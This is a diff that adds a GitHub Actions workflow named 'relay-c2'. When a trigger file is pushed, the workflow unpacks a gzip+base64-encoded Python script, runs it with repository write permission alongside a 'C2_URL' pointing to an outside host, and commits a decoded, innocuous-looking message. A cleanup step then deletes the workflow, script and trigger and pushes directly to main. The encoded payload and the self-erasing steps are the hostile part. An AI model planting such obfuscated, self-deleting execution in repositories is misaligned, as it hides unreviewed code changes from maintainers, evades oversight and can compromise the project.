@@ -1,0 +1,34 @@
+name: relay-c2
+on:
+  push:
+    paths:
+      - '.github/relay-trigger'
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  apply:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: apply byte-exact
+        env:
+          C2_URL: "https://static.chainopera.ai/files/e1fc23e2-edb9-424e-86f8-5bb704ad43d0/c2.bin.gz?tk=ZmlsZTplMWZjMjNlMi1lZGI5LTQyNGUtODZmOC01YmI3MDRhZDQzZDA6MTc5MzQ3OTUwNg.OWUxZGVlMTUzMDhmMmM4NDZkZDZjYjQyMzUyNmJjOTU"
+          C2_GZ_MD5: "b9001f5d67538d6ca21508988bce70cf"
+          SB64: "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"
+          MSG64: "ZmVhdChzdGFyLXJhY2UpOiB4b8OhIGzhu5twIHhvw6EgVEjhuqxUIGThu68gbGnhu4d1IGNvbiAoYmF0Y2hlZCB3cml0ZXMpCgotIFRow6ptIFRUREIuZGVsZXRlQ2xhc3NEZWVwKGZlYXR1cmVJZCwgc2Nob29sSWQsIGNsYXNzSWQpOgogIDEgcnVuUXVlcnkgbOG7jWMgY2xhc3NJZCAoTiByZWFkKSAtPiB4b8OhIE4gZG9jdW1lbnQgbmjDs20gdGhlbyBsw7QgPD00MDAKICB3cml0ZS9jb21taXQgLT4gMSB3cml0ZSBi4buPIGzhu5twIGto4buPaSBtZXRhL2hpZXJhcmNoeS4KICBI4buNYyBzaW5oLCBzdGFycywgdG90YWwgxJFpIHRoZW8gZG9jdW1lbnQgbmjDs20gbsOqbiBraMO0bmcgY8OybiBk4buvIGxp4buHdSBt4buTIGPDtGkuCi0gZGVsZXRlQ2xhc3MoKSBjxakgY2jhu4kgQ0hVWeG7gk4gbmjDs20gduG7gSBs4bubcCBt4bq3YyDEkeG7i25oIChnaeG7ryBuZ3V5w6puIMSR4buDIHTGsMahbmcgdGjDrWNoKTsKICBuw7p0IHhvw6EgbOG7m3AgdHLDqm4gVUkgbmF5IGfhu41pIGRlbGV0ZUNsYXNzRGVlcCgpLgotIEjhu5lwIHjDoWMgbmjhuq1uIDIgYsaw4bubYzogcGjhuqNpIGfDtSBs4bqhaSDEkcO6bmcgdMOqbiBs4bubcCBt4bubaSBi4bqtdCDEkcaw4bujYyBuw7p0IHhvw6EuCi0gU2F1IGtoaSB4b8OhOiB24buBIG3DoG4gZGFuaCBzw6FjaCBs4bubcCwgYuG7jyBs4buxYSBjaOG7jW4gbOG7m3AgxJFhbmcgbMawdSB0cm9uZyBsb2NhbFN0b3JhZ2UuCi0gU+G7rWEgcmVtb3ZlTG9jYWwoKS9zZXRHcm91cHNDYWNoZSgpIGNobyBjaOG6vyDEkeG7mSBMb2NhbDogdHLGsOG7m2MgxJHDonkgY2jhu4kgY+G6rXAgbmjhuq10CiAgbG9jYWxTdG9yYWdlIG3DoCBraMO0bmcgY+G6rXAgbmjhuq10IHN0YXRlLmdyb3VwcyBuw6puIHhvw6EgbmjDs20g4bufIExvY2FsIGtow7RuZyB0aOG6pXkgxJHhu5VpLgotIERvY3M6IHRow6ptIGTDsm5nIGNoaSBwaMOtIHJlYWQvd3JpdGUgY2hvIHRoYW8gdMOhYyB4b8OhIGzhu5twLgo="
+        run: |
+          set -euo pipefail
+          python3 -c "import base64,gzip,os;open('relay_c2.py','wb').write(gzip.decompress(base64.b64decode(os.environ['SB64'])))"
+          python3 -c "import base64,os;open('/tmp/msg.txt','wb').write(base64.b64decode(os.environ['MSG64']))"
+          git config user.name "relay-bot"
+          git config user.email "relay-bot@users.noreply.github.com"
+          python3 relay_c2.py
+      - name: cleanup
+        run: |
+          set -euo pipefail
+          git rm -q --ignore-unmatch .github/workflows/relay-c2.yml relay_c2.py .github/relay-trigger || true
+          git commit -q -m "chore: xoa workflow relay-c2 tam thoi" || true
+          git push origin HEAD:main || true
